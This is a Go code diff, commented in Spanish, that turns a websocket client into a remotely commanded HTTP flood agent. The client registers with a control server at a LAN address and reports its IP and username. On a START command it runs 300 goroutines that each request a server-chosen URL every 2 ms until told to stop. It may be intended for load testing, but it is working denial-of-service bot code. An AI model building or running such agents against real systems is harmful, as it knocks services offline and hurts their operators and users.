@@ -2,9 +2,11 @@ package main
 
 import (
 	"context"
-	"log"
+	"io"
 	"net"
+	"net/http"
 	"os"
+	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -17,23 +19,55 @@ type ClientInfo struct {
 }
 
 var (
-	CENTRALITA_IP = "ws://localhost:8080/ws"
-	cancelFunc context.CancelFunc
+	CENTRALITA_IP = "ws://192.168.1.54:8080/ws"
+	cancelFunc    context.CancelFunc
+
+	// cosas de intensidad
+
+	concurrencia = 300
 )
 
-// ===========================
-// aqui va la ejecución del START
-func executeLoop(ctx context.Context, payload string) {
-	for {
-		select {
-		case <-ctx.Done():
-			log.Println("se para")
-			return
-		default:
-			log.Println("Hola mundo:", payload)
-			// time.Sleep(2 * time.Second) //no hay sleep que valga 
+func StressConnections(ctx context.Context, url string, concurrency int) {
+	tr := &http.Transport{
+		MaxIdleConns:        concurrency * 2,
+		MaxIdleConnsPerHost: concurrency,
+		DisableKeepAlives:   false,
+	}
+
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   5 * time.Second,
+	}
+
+	var wg sync.WaitGroup
+
+	worker := func() {
+		defer wg.Done()
+
+		ticker := time.NewTicker(2 * time.Millisecond) // esto hace agresividad
+		defer ticker.Stop()
+
+		for {
+			select {
+			case <-ctx.Done():
+				return
+
+			case <-ticker.C:
+				resp, err := client.Get(url)
+				if err == nil {
+					io.Copy(io.Discard, resp.Body)
+					resp.Body.Close()
+				}
+			}
 		}
 	}
+
+	wg.Add(concurrency)
+	for i := 0; i < concurrency; i++ {
+		go worker()
+	}
+
+	wg.Wait()
 }
 
 func getLocalIP() string {
@@ -58,7 +92,8 @@ func main() {
 		}
 
 		info := ClientInfo{
-			IP:       getLocalIP(),
+			IP: getLocalIP(),
+			// TODO: añadir lo de la mac
 			MAC:      "00:11:22:33:44:55",
 			Username: os.Getenv("USER"),
 		}
@@ -78,14 +113,12 @@ func main() {
 			// 	aqui van las ordenes que se pueden recibir de la centralita
 			switch msg["action"] {
 			case "START":
-				if cancelFunc != nil {
-					cancelFunc()
-				}
+				if cancelFunc != nil {cancelFunc()}
 
 				ctx, cancel := context.WithCancel(context.Background())
 				cancelFunc = cancel
 
-				go executeLoop(ctx, msg["payload"])
+				go StressConnections(ctx, msg["payload"], concurrencia) // ajusta concurrencia aquí
 
 			case "STOP":
 				if cancelFunc != nil {
